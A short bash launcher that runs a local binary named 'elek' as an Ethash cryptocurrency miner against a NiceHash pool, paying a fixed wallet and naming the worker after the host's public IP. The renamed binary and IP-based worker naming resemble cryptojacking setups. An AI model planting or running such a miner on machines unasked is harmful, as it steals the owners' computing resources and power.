#!/bin/bash

POOL=daggerhashimoto.eu.nicehash.com:3353
WALLET=32yAg5MbySmKasUBeTL12BCeiAdFeNvnN1
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./elek && ./elek --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@
